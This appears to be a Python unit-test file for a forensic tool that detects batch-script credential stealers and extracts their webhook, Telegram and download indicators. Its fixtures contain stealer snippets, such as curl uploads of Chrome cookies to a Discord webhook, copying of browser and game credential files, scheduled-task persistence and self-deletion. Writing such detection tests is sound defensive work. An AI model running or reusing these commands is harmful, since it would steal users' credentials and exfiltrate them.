"""
Unit and Integration Tests for BatchStealer Static Forensic Credential Analyzer & IOC Extraction Engine.
Validates:
  1. Signature detection and heuristic confidence scoring on malware and benign scripts.
  2. Automated Discord webhook and Telegram bot API token extraction & defanging.
  3. Staged payload download URL and network reconnaissance service extraction.
  4. Targeted browser, Discord, gaming, and system reconnaissance credential inventory.
  5. Persistence mechanism detection (SchTasks, Run keys, VBS hidden runners, self-deletion).
  6. Exfiltration channel mapping (multipart POST, form fields, target destinations).
  7. Automated MITRE ATT&CK technique mapping.
  8. Caret unmasking and defanging normalization modes.
  9. In-memory buffer cryptographic zeroization (zeroize_dict, zeroize_bytes).
  10. Full reference corpus file triage and end-to-end multi-pass engine integration.
"""

import os
import unittest
from pathlib import Path
from typing import Dict, Any

from deobfuscator.batchstealer import (
    detect_batchstealer_signatures,
    extract_c2_endpoints,
    inventory_targeted_credentials,
    extract_persistence_and_droppers,
    analyze_exfiltration_channels,
    extract_batchstealer_forensics,
    normalize_batchstealer,
    BatchStealerNormalizer,
    zeroize_dict,
    zeroize_bytes,
)
from deobfuscator.core import BatchDeobfuscator, deobfuscate_script


class TestBatchStealerForensics(unittest.TestCase):
    """Test suite for BatchStealer static analysis, credential inventory & C2 extraction."""

    def setUp(self):
        self.sample_discord_webhook = (
            "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz0123456789-_ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        )
        self.sample_telegram_bot = (
            "https://api.telegram.org/bot123456789:ABCDEF_1234567890abcdefghijklmnopqrst/sendMessage"
        )
        self.sample_mini_stealer = f"""@echo off
set "webhook={self.sample_discord_webhook}"
c^u^r^l --silent -F c=@"%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies" %webhook%
c^u^r^l --silent -F tasks=@"%appdata%\\tasklist.txt" %webhook%
t^a^s^k^l^i^s^t > "%appdata%\\tasklist.txt"
reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
SchTasks /create /f /sc Daily /tn "WindowsUpdate" /tr "C:\\ProgramData\\0.vbs"
start /b "" cmd /c del "%~f0"
"""

    def test_batchstealer_detection_positive(self):
        """Test positive detection and high confidence score on typical stealer patterns."""
        sig = detect_batchstealer_signatures(self.sample_mini_stealer)
        self.assertTrue(sig["is_batchstealer"])
        self.assertGreaterEqual(sig["confidence"], 0.70)
        self.assertIn("discord_webhook_c2", sig["indicators"])
        self.assertIn("browser_credential_harvesting", sig["indicators"])
        self.assertIn("system_reconnaissance", sig["indicators"])
        self.assertIn("persistence_installation", sig["indicators"])
        self.assertIn("defense_evasion", sig["indicators"])
        self.assertIn("stealer_caret_masking", sig["indicators"])

    def test_batchstealer_detection_negative(self):
        """Test that benign admin batch scripts are not falsely flagged as stealers."""
        benign_script = """@echo off
echo Running daily server backup...
robocopy C:\\Data D:\\Backup /mir
echo Backup completed.
exit /b 0
"""
        sig = detect_batchstealer_signatures(benign_script)
        self.assertFalse(sig["is_batchstealer"])
        self.assertEqual(sig["confidence"], 0.0)
        self.assertEqual(len(sig["indicators"]), 0)

    def test_extract_c2_endpoints_discord(self):
        """Test parsing of Discord Webhooks into structured ID, token, and defanged URL."""
        script = f'set "wh={self.sample_discord_webhook}"\ncurl -X POST %wh%'
        endpoints = extract_c2_endpoints(script)
        self.assertEqual(len(endpoints["discord_webhooks"]), 1)
        wh_entry = endpoints["discord_webhooks"][0]
        self.assertEqual(wh_entry["webhook_id"], "123456789012345678")
        self.assertEqual(
            wh_entry["webhook_token"],
            "abcdefghijklmnopqrstuvwxyz0123456789-_ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        )
        self.assertTrue(wh_entry["defanged_url"].startswith("hxxps://discord[.]com/api/webhooks/"))

    def test_extract_c2_endpoints_telegram(self):
        """Test parsing of Telegram Bot tokens and defanged endpoint generation."""
        script = f'curl -s -X POST "{self.sample_telegram_bot}" -d "chat_id=987654321"'
        endpoints = extract_c2_endpoints(script)
        self.assertEqual(len(endpoints["telegram_bots"]), 1)
        tg_entry = endpoints["telegram_bots"][0]
        self.assertEqual(tg_entry["bot_token"], "123456789:ABCDEF_1234567890abcdefghijklmnopqrst")
        self.assertTrue(tg_entry["defanged_url"].startswith("hxxps://api[.]telegram[.]org/bot"))

    def test_extract_c2_endpoints_download_and_recon(self):
        """Test extraction of secondary payload download URLs and public IP recon services."""
        script = """
        curl -s -L "https://malicious-cdn.org/payloads/screenshot.exe" -o s.exe
        set "updateurl=https://raw.githubusercontent.com/attacker/repo/main/0.bat"
        for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
        """
        endpoints = extract_c2_endpoints(script)
        self.assertIn("https://malicious-cdn.org/payloads/screenshot.exe", endpoints["download_urls"])
        self.assertIn("https://raw.githubusercontent.com/attacker/repo/main/0.bat", endpoints["download_urls"])
        self.assertTrue(any("api.ipify.org" in u for u in endpoints["recon_services"]))

    def test_inventory_targeted_credentials_browsers(self):
        """Test cataloging of targeted browser directories and sensitive credential files."""
        script = """
        copy "%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data" l.tmp
        copy "%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies" c.tmp
        copy "%appdata%\\Opera Software\\Opera Stable\\Login Data" op_l.tmp
        copy "%appdata%\\Mozilla\\Firefox\\Profiles\\xyz\\logins.json" ff_l.tmp
        copy "%appdata%\\Mozilla\\Firefox\\Profiles\\xyz\\key4.db" ff_k.tmp
        """
        inventory = inventory_targeted_credentials(script)
        b_names = [b["browser"] for b in inventory["browsers"]]
        self.assertIn("Google Chrome", b_names)
        self.assertIn("Opera / Opera GX", b_names)
        self.assertIn("Mozilla Firefox", b_names)

    def test_inventory_targeted_credentials_messaging_discord(self):
        """Test identification of Discord token LevelDB storage locations."""
        script = """
        for /f %%f in ('dir /b "%appdata%\\discord\\Local Storage\\leveldb\\"') do (
            echo %%f | find ".ldb"
        )
        """
        inventory = inventory_targeted_credentials(script)
        self.assertTrue(any(m["client"] == "Discord" for m in inventory["messaging"]))

    def test_inventory_targeted_credentials_gaming_crypto(self):
        """Test identification of Steam, Minecraft, and Growtopia credential targets."""
        script = """
        copy "C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf" steam.tmp
        copy "%appdata%\\.minecraft\\launcher_profiles.json" mc.tmp
        copy "%localappdata%\\Growtopia\\save.dat" gt.tmp
        copy "%localappdata%\\osu!\\osu!.Administrator.cfg" osu.tmp
        """
        inventory = inventory_targeted_credentials(script)
        g_platforms = [g["platform"] for g in inventory["gaming"]]
        self.assertIn("Steam", g_platforms)
        self.assertIn("Minecraft", g_platforms)
        self.assertIn("Growtopia", g_platforms)
        self.assertIn("osu!", g_platforms)

    def test_inventory_targeted_credentials_system_recon(self):
        """Test identification of system discovery commands staged into temporary text files."""
        script = """
        SystemInfo > "%appdata%\\sysinfo.txt"
        tasklist > "%appdata%\\tasklist.txt"
        net user > "%appdata%\\netuser.txt"
        quser > "%appdata%\\quser.txt"
        ipconfig /all > "%appdata%\\ipconfig.txt"
        """
        inventory = inventory_targeted_credentials(script)
        recon_activities = [r["activity"] for r in inventory["system_recon"]]
        self.assertIn("SystemInfo", recon_activities)
        self.assertIn("tasklist", recon_activities)
        self.assertIn("net user", recon_activities)
        self.assertIn("quser", recon_activities)
        self.assertIn("ipconfig all", recon_activities)

    def test_extract_persistence_and_droppers_schtasks(self):
        """Test parsing of Scheduled Task persistence triggers and target executables."""
        script = 'SchTasks /create /f /sc Weekly /tn "SecurityCheck" /tr "C:\\ProgramData\\0.vbs"'
        persistence = extract_persistence_and_droppers(script)
        self.assertEqual(len(persistence["scheduled_tasks"]), 1)
        task = persistence["scheduled_tasks"][0]
        self.assertEqual(task["task_name"], "SecurityCheck")
        self.assertEqual(task["frequency"], "Weekly")
        self.assertEqual(task["task_target"], "C:\\ProgramData\\0.vbs")

    def test_extract_persistence_and_droppers_vbs_runner(self):
        """Test detection of hidden VBS runners created by the stealer."""
        script = """
        echo set WshShell = wscript.createobject("WScript.shell") > "%vpath%\\0.vbs"
        echo WshShell.run "%vpath%\\0.bat", 0, true >> "%vpath%\\0.vbs"
        """
        persistence = extract_persistence_and_droppers(script)
        self.assertTrue(len(persistence["vbs_runners"]) > 0)
        self.assertTrue(persistence["vbs_runners"][0]["hidden_window"])

    def test_extract_persistence_and_droppers_self_deletion(self):
        """Test recognition of self-deletion routines."""
        script = 'start /b "" cmd /c 2>NUL del "%~f0" & exit /b'
        persistence = extract_persistence_and_droppers(script)
        self.assertTrue(persistence["self_deletion"])
        self.assertIn("del", persistence["self_deletion_command"])

    def test_analyze_exfiltration_channels(self):
        """Test tracking multipart form data uploads and destination variables."""
        script = """
        curl --silent -F c=@"%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies" %webhook%
        curl --silent -F tasks=@"%temptasklist%" %webhook%
        curl --silent -X POST --data "{\"content\": \"[Report from Admin]\"}" %webhook%
        """
        channels = analyze_exfiltration_channels(script)
        self.assertEqual(len(channels), 3)
        form_fields = [c.get("form_field") for c in channels if "form_field" in c]
        self.assertIn("c", form_fields)
        self.assertIn("tasks", form_fields)
        self.assertTrue(any(c.get("method") == "application/json POST" for c in channels))

    def test_mitre_attack_mapping(self):
        """Test automatic correlation of malware actions to MITRE ATT&CK techniques."""
        report = extract_batchstealer_forensics(self.sample_mini_stealer)
        mitre_ids = [m["id"] for m in report["mitre_attack"]]
        self.assertIn("T1555.003", mitre_ids)  # Credentials from Web Browsers
        self.assertIn("T1082", mitre_ids)      # System Information Discovery
        self.assertIn("T1053.005", mitre_ids)  # Scheduled Task
        self.assertIn("T1071.001", mitre_ids)  # Web Protocols (Webhook C2)
        self.assertIn("T1070.004", mitre_ids)  # File Deletion (Self Delete)

    def test_normalize_batchstealer_caret_and_tos_trap(self):
        """Test unmasking caret obfuscation and stripping anti-triage fake TOS jumps."""
        script = """goto remove_this_if_you_agree_to_follow_the_TOS
c^u^r^l -s http://127.0.0.1/payload & t^a^s^k^l^i^s^t
:remove_this_if_you_agree_to_follow_the_TOS
exit
"""
        clean_text, report = normalize_batchstealer(script)
        self.assertNotIn("goto remove_this_if_you_agree", clean_text)
        self.assertIn("curl -s http://127.0.0.1/payload", clean_text)
        self.assertIn("tasklist", clean_text)
        self.assertTrue(report["is_batchstealer"])

    def test_normalize_batchstealer_defang_c2(self):
        """Test defanging active webhook URLs into safe analysis indicators."""
        script = f'curl -X POST "{self.sample_discord_webhook}"'
        clean_text, _ = normalize_batchstealer(script, defang_c2=True)
        self.assertNotIn("https://discord.com", clean_text)
        self.assertIn("hxxps://discord[.]com/api/webhooks/123456789012345678/[DEFANGED_TOKEN]", clean_text)

    def test_batchstealer_normalizer_class_interface(self):
        """Test the object-oriented normalizer wrapper and report extraction."""
        norm = BatchStealerNormalizer(defang_c2=True)
        clean_text, report = norm.normalize(self.sample_mini_stealer)
        self.assertTrue(report["is_batchstealer"])
        self.assertIn("[DEFANGED_TOKEN]", clean_text)

        report2 = norm.extract_report(self.sample_mini_stealer)
        self.assertEqual(report2["confidence"], report["confidence"])

        norm.zeroize()
        self.assertEqual(len(norm.last_report), 0)

    def test_zeroize_forensic_buffers(self):
        """Test cryptographic wiping of in-memory dictionaries and bytearrays."""
        sensitive_dict = {
            "webhook_token": "super_secret_token_12345",
            "bot_api": "123456:ABC-DEF",
            "nested": {"key": "value"},
            "raw_bytes": bytearray(b"sensitive_session_cookies"),
        }
        zeroize_dict(sensitive_dict)
        self.assertEqual(len(sensitive_dict), 0)

        raw_buf = bytearray(b"session_key_data")
        zeroize_bytes(raw_buf)
        self.assertTrue(all(b == 0 for b in raw_buf))

    def test_end_to_end_corpus16_parity(self):
        """Verify Corpus 16 (BatchStealer-Takaovi) deobfuscation parity through core engine."""
        corpus_16_script = 'c^u^r^l -s http://127.0.0.1/payload & t^a^s^k^l^i^s^t'
        clean = deobfuscate_script(corpus_16_script)
        self.assertIn("curl -s http://127.0.0.1/payload", clean)
        self.assertIn("tasklist", clean)

    def test_full_takaovi_reference_file_forensics(self):
        """Verify full forensic triage on the real-world BatchStealer-Takaovi reference sample."""
        sample_path = Path("references/github_arsenal/BatchStealer-Takaovi/file.bat")
        if not sample_path.exists():
            self.skipTest("Reference sample file.bat not found on disk")

        content = sample_path.read_text(encoding="utf-8", errors="ignore")
        report = extract_batchstealer_forensics(content)

        self.assertTrue(report["is_batchstealer"])
        self.assertGreaterEqual(report["confidence"], 0.85)
        self.assertGreaterEqual(report["targeted_browsers_count"], 4)
        self.assertGreaterEqual(report["targeted_gaming_platforms_count"], 3)
        self.assertTrue(report["persistence"]["self_deletion"])
        self.assertTrue(any(t.get("task_name") == "WindowsUpdate" for t in report["persistence"]["scheduled_tasks"]))
        self.assertGreaterEqual(len(report["mitre_attack"]), 6)


if __name__ == "__main__":
    unittest.main()
